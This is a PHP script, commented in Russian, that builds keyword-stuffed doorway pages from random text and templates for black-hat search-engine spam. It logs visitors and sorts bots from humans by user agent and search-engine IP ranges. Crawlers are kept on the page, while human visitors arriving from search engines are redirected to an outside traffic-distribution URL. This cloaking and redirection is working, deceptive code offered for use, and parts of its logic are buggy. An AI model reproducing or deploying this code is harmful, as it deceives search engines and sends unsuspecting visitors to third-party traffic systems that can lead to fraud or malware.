<?php

error_reporting(0);
require_once 'func.php'; //Функции
require_once 'config.php'; //Настройки

//-----------------------------------------------------------------------------------------------------------------------------------------
// Параметры статистики
$is_bot = FALSE ;
$agent11 = $_SERVER['HTTP_USER_AGENT'];
$uri11 = $_SERVER['REQUEST_URI'];
//$user11 = $_SERVER['PHP_AUTH_USER'];
$ip11 = $_SERVER['REMOTE_ADDR'];
$ref11 = $_SERVER['HTTP_REFERER'];
$dtime11 = date('r');

if($ref11 == "")
{
  $ref11 = "None";
}
if($user11 == "")
{
  $user11 = "None";
}

//   Строка статистики
$entry_line11 = "$dtime11|$ip11|$agent11|$uri11|$ref11\n";


u_agent_check($agent11,$ref11,$entry_line11);


function WriteLogs11 ($fname11,$entry_line11)
{
	// Записываем логи в файл
	
if (file_exists($fname11)) {
	if (filesize($fname11)<1048000)
	{
      $file=fopen("$fname11", "a");
      fwrite ($file, $entry_line11);
      fclose($file);
	}
} else {
   touch($fname11);
   chmod($fname11, 0600);
   $file=fopen($fname11, "w");
   fwrite($file,$entry_line11);
   fclose($file);
  }
}

function ip_check()
{
  $stop_ips_masks = array(
        "66\.249\.[6-9][0-9]\.[0-9]+",    // Google    NetRange:   66.249.64.0 - 66.249.95.255
        "74\.125\.[0-9]+\.[0-9]+",        // Google     NetRange:   74.125.0.0 - 74.125.255.255
        "65\.5[2-5]\.[0-9]+\.[0-9]+",    // MSN        NetRange:   65.52.0.0 - 65.55.255.255,
		"131\.107\.[0-9]+\.[0-9]+",      // MSN Hitrobot     NetRange:   131.107.0.0 - 131.107.255.255
        "74\.6\.[0-9]+\.[0-9]+",        // Yahoo    NetRange:   74.6.0.0 - 74.6.255.255
        "67\.195\.[0-9]+\.[0-9]+",        // Yahoo#2    NetRange:   67.195.0.0 - 67.195.255.255
        "72\.30\.[0-9]+\.[0-9]+",        // Yahoo#3    NetRange:   72.30.0.0 - 72.30.255.255
        "38\.[0-9]+\.[0-9]+\.[0-9]+",     // Cuill:     NetRange:   38.0.0.0 - 38.255.255.255
        "93\.172\.94\.227",                // MacFinder
        "212\.100\.250\.218",            // Wells Search II
        "71\.165\.223\.134",            // Indy Library
        "70\.91\.180\.25",
        "65\.93\.62\.242",
        "74\.193\.246\.129",
        "213\.144\.15\.38",
        "195\.92\.229\.2",
        "70\.50\.189\.191",
        "218\.28\.88\.99",
        "165\.160\.2\.20",
        "89\.122\.224\.230",
        "66\.230\.175\.124",
        "218\.18\.174\.27",
        "65\.33\.87\.94",
        "67\.210\.111\.241",
        "81\.135\.175\.70",
        "64\.69\.34\.134",
        "89\.149\.253\.169"
    );



   // проверим IP'шник
foreach ( $stop_ips_masks as $k=>$v )
{
    if ( preg_match( '#^'.$v.'$#', $_SERVER['REMOTE_ADDR']) )
    {
    	 return  true ;
    }else
     {
        return false;
     }
}
}

function u_agent_check($agent11,$ref11,$entry_line11)
{
if(strstr($agent11, 'bot') || strstr($agent11, 'urp')||ip_check()) 
 {
 	// Если боты
     WriteLogs11('bots.data',$entry_line11);
 } else if (strstr($ref11,'google.')||strstr($ref11,'msn.')||strstr($ref11,'live.com')
      ||strstr($ref11,'yahoo.')||strstr($ref11,'altavista.')||strstr($ref11,'aol.')
     ||strstr($ref11,'ask.')||strstr($ref11,'eureka.com')||strstr($ref11,'hotbot.com')
     ||strstr($ref11,'infoseek.com')||strstr($ref11,'webcrawler.')||strstr($ref11,'excite.')
     ||strstr($ref11,'netscape.com')||strstr($ref11,'mamma.com')||strstr($ref11,'alltheweb.com')
     ||strstr($ref11,'northernlight.com')||strstr($ref11,'rambler.ru')||strstr($ref11,'aport.ru')
     ||strstr($ref11,'yandex.ru')||strstr($ref11,'pingwin.ru')||strstr($ref11,'www.ru')
     ||strstr($ref11,'punto.ru')||strstr($ref11,'search.comcast.net')||strstr($ref11,'abcsok.no')
     ||strstr($ref11,'myspace.com')||strstr($ref11,'looksmart.com')||strstr($ref11,'bing.com'))
  { 
  	// Если  с поисковика
     WriteLogs11("human.data",$entry_line11);
     if(!strstr($ref11,$_SERVER["HTTP_HOST"])&&(!strpos(gethostbyaddr($_SERVER['REMOTE_ADDR']), 'google')))
     {
        header("Location: http://trraf.com/in.cgi?7&seoref="
               .rawurlencode($_SERVER["HTTP_REFERER"])."&parameter=\$keyword&se=\$se&ur=1&HTTP_REFERER="
               .rawurlencode("http://".$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"])."&default_keyword=");
     }
  } else
  {
     WriteLogs11("noref.data",$entry_line11);
  }
}

//-------------------------------------------------------------------------



$page = getpage($_GET['page']); //Удаляем двойные точки и слеш после них
if (!$page) $page="0";
$host = trim($_SERVER['HTTP_HOST']); //Получаем текущий домен
$host = preg_replace('#^www\.#', '', $host); //Сносим www.
$hostwp = $host.str_replace("index.php","",$_SERVER['PHP_SELF']);

if (!file_exists($host)) { //Создаем папку для текущего домена
    if (!mkdir($host, 0777)) die("Не удалось создать папку $host! Ищите проблему у себя ;)");
    if (!mkdir("$host/pages", 0777)) die("Не удалось создать папку $host/pages! Ищите проблему у себя ;)");
}



if (!file_exists("$host/text.txt")) { //Выбираем текст
    $files = array();
    $dir = opendir('texts');
    while (($file = readdir($dir)) !== false){
        if (!is_dir("texts/$file") && $file != "." && $file != ".."){
            $files[] = $file;
        }
    }
    closedir($dir);
    if (in_array("$host.txt", $files)) $text_file = "$host.txt"; //Если есть файл с именем site.ru.txt, выбираем его.
    else $text_file = $files[array_rand($files)]; //Иначе берём случайный
    
    if (!copy("texts/$text_file", "$host/text.txt")) die("Не удалось скопировать текст $texts/$text_file в $host/text.txt! Ищите проблему у себя ;)");
}



if (!file_exists("$host/keys.txt")){ //Выбираем ключи
    $files = array();
    $dir = opendir('keys');
    while (($file = readdir($dir)) !== false){
        if (!is_dir("keys/$file") && $file != "." && $file != ".."){
            $files[] = $file;
        }
    }
    closedir($dir);
    
    if (in_array("$host.txt", $files)) $keys_file = "$host.txt"; //Если есть файл с именем site.ru.txt, выбираем его.
    else $keys_file = $files[array_rand($files)]; //Иначе берём случайный
    
    $keys = file("keys/$keys_file");
    $temp = array();
    $keyindex = 0;
    foreach($keys as $key){
        $temp[] = trim($key).'::'.$keyindex;//.translit(trim($key));
        $keyindex = $keyindex + 1;
    }
    
    $fp = fopen("$host/keys.txt", 'w+');
    fwrite($fp, implode("\r\n", $temp));
    fclose($fp);

}




if (!file_exists("theme.html")){ //Выбираем шаблон
    $files = array();
    $dir = opendir('shabs');
    while (($file = readdir($dir)) !== false){
        if (is_dir("shabs/$file") && $file != "." && $file != ".."){
            $files[] = $file;
        }
    }
    closedir($dir);
    
    if (in_array($host, $files)) $shab_file = $host; //Если есть папка с именем site.ru.txt, выбираем её.
    else $shab_file = $files[array_rand($files)]; //Иначе берём случайную
    
    if (!copyall("shabs/$shab_file", "./")) die("Не удалось скопировать папку с шаблоном shabs/$shab_file!");
}




 htmlmap();




if(is_numeric($page))
{
    $keys = file("$host/keys.txt");
    foreach($keys as $key){
        list($anchors[], $pages[]) = explode("::", trim($key));
    }
    //if ($page == "") $name = $pages[0];
    if (in_array($page,$pages))
    {
 
        if (file_exists("$host/pages/$page")) 
        {
           header("Content-type: text/html");
           echo file_get_contents("$host/pages/$page");
           exit;
         }    
         $key = $anchors[array_search($page, $pages)];
    if(file_exists("./theme.html")) $template = file_get_contents("./theme.html");
        else die("Не найден файл theme.html в $host/shab!");
        
        //[TEXT-x-y]
        if(preg_match('#\[TEXT-(\d+)-(\d+)\]#', $template, $num)){
            for($i=0; $i<250; $i) {
                if (!preg_match('#\[TEXT-(\d+)-(\d+)\]#', $template)) break;
                $text = generate("$host/text.txt", mt_rand($num[1], $num[2]), $generate);
                $text = explode(' ', $text);
                $size = count($text);
                $plot = mt_rand($min_plot, $max_plot);
                $kolvo = ceil($plot * $size/100);
                for ($i = 0; $i<$kolvo; $i++){
                    $tag = $tags[array_rand($tags)];
                    if (rand(1,10)<4)
                    {
                       $string = "<$tag>$key</$tag>";
                    }else 
                    {
                       $string = $key; 
                    } 
                    $text[array_rand($text)] = $string;
                }
                $text = implode(" ", $text);
                $template = preg_replace('#\[TEXT-\d+-\d+\]#', $text, $template, 1);
            }
        }
        
        
        //[RTEXT-x-y]
        if(preg_match('#\[RTEXT-(\d+)-(\d+)\]#', $template, $num)){
            for($i=0; $i<250; $i){
                if(!preg_match('#\[RTEXT-(\d+)-(\d+)\]#', $template)) break;
                $text = generate("$host/text.txt", mt_rand($num[1], $num[2]), false);
                $template = preg_replace('#\[RTEXT-(\d+)-(\d+)\]#', $text, $template, 1);
            }
        }
        
        //[KTEXT-x-y]
        if(preg_match('#\[KTEXT-(\d+)-(\d+)\]#', $template, $num)){
            for($i=0; $i<250; $i){
                if(!preg_match('#\[KTEXT-(\d+)-(\d+)\]#', $template)) break;
                $text = generate("$host/text.txt", mt_rand($num[1], $num[2]), false);
                $text = explode(' ', $text);
                $size = count($text);
                $plot = mt_rand($min_plot, $max_plot);
                $kolvo = ceil($plot * $size/100);
                for ($i = 0; $i<$kolvo; $i++){
                    $tag = $tags[array_rand($tags)];
                    $string = "<$tag>$key</$tag>";
                    $text[array_rand($text)] = $string;
                }
                $text = implode(" ", $text);
                $template = preg_replace('#\[KTEXT-(\d+)-(\d+)\]#', $text, $template, 1);
            }
        }
        
        //[RAND-x-y]
        if (preg_match('#\[RAND-(\d+)-(\d+)\]#', $template, $num)) {
            for($i=0; $i<250; $i) {
                if(!preg_match('#\[RAND-(\d+)-(\d+)\]#', $template)) break;
                $rand = mt_rand($num[1], $num[2]);
                $template = preg_replace('#\[RAND-\d+-\d+\]#', $rand, $template, 1);
            }
        }
        
        //[KEYWORD]
        if (preg_match('#\[KEYWORD\]#', $template)) {
            $template = preg_replace('#\[KEYWORD\]#', $key, $template);
        }
        
        //[BKEYWORD]
        if (preg_match('#\[BKEYWORD\]#', $template)) {
            $template = preg_replace('#\[BKEYWORD\]#', ucfirst(strtolower($key)), $template);
        }
        
        //[RANDKEYWORD]
        if (preg_match('#\[RANDKEYWORD\]#', $template)) {
            for($i=0; $i<250; $i){
                if(!preg_match('#\[RANDKEYWORD\]#', $template)) break;
                $rand = $anchors[array_rand($anchors)];
                $template = preg_replace('#\[RANDKEYWORD\]#', $rand, $template, 1);
            }
            
        }
        
        //[RANDKEYWORDURL]
        if (preg_match('#\[RANDKEYWORDURL\]#', $template)) {
            for($i=0; $i<250; $i){
                if(!preg_match('#\[RANDKEYWORDURL\]#', $template)) break;
                $pg = $pages[array_rand($pages)];
                $anchor = $anchors[array_search($pg, $pages)];
                $url = "<a href='?page=$pg'>$anchor</a>";
                $template = preg_replace('#\[RANDKEYWORDURL\]#', $url, $template, 1);
            }
            
        }
        
        //[SITE]
        if (preg_match('#\[SITE\]#', $template)) {
            $template = preg_replace('#\[SITE\]#', $hostwp, $template);
        }
        
        //[MAPLINK=Карта дора]
        if (preg_match('#\[MAPLINK=(.+)\]#isU', $template, $mlink)) {
            //if ($name == $pages[0]) 
            $replace = "<a href='$map.html'>{$mlink[1]}</a>";
            //else $replace = "";
            $template = preg_replace('#\[MAPLINK=(.+)\]#isU', $replace, $template);
        }
        
        //[PAGES]
        if(preg_match('#\[PAGES\]#', $template)) {
            $index = array_search($name, $pages);
            $n_min = $index-4;
            $n_max = $index+5;
            $result1 = $n_min.':'.$n_max;
            $result = '';
            for($i=$n_min;$i<$n_max;$i++){
                if(!isset($pages[$i])) continue;
                if($i != $index) $result .= "<a href='page={$pages[$i]}'>".($i+1)."</a> ";
                else $result .= "<b>".($i+1)."</b> ";
            }
            $template = preg_replace('#\[PAGES\]#', $result, $template);
        }
        
        //[[1|2|3|4]]
        if(preg_match('#\[\[([^\[\[]*)\]\]#', $template, $incl)) 
        {
           $random = explode("|", $incl[1]);
           $random = $random[array_rand($random)];
           $template = preg_replace('#\[\[([^\[\[]*)\]\]#', $random, $template);
        }
        
       $fp = fopen("$host/pages/$page", 'w+');
	   fwrite($fp, $template);
	   fclose($fp);
        
        header('Content-type: text/html');
        echo $template;
        exit;
    }
    else 
    {
       	header("HTTP/1.0 404 Not Found");
    	die(file_get_contents('404.html'));
    }
}
else 
    {
       	header("HTTP/1.0 404 Not Found");
    	die(file_get_contents('404.html'));
    }

?>